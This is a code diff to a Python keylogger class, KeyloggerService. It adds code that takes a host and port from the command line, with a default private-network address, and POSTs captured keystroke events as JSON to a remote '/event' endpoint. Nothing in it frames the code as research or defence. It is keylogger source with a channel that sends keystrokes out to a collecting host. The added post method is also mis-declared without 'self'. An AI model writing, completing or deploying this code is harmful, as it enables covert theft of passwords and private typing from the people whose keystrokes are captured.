@@ -3,8 +3,14 @@ from datetime import datetime
 import string
 import threading
 import time
-import queue  # NEW
+import queue  
+import sys
+import urllib.request
+import json
 
+HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.77.129"
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5050
+URL  = f"http://{HOST}:{PORT}/event"
 
 class KeyloggerService:
     def __init__(self, callback, combine=True, idle_ms=800, ui_queue: "queue.Queue|None" = None):
@@ -30,6 +36,14 @@ class KeyloggerService:
 
         # punctuation that should flush a chunk (end of word/sentence feel)
         self._flush_punct = set(" .,!?:;)]}")
+
+    def post(evt):
+        data = json.dumps(evt).encode("utf-8")
+        req = urllib.request.Request(URL, data=data,
+                                    headers={"Content-Type": "application/json"},
+                                    method="POST")
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            resp.read()
 
     # ---------- buffer helpers ----------
     def _now_str(self):
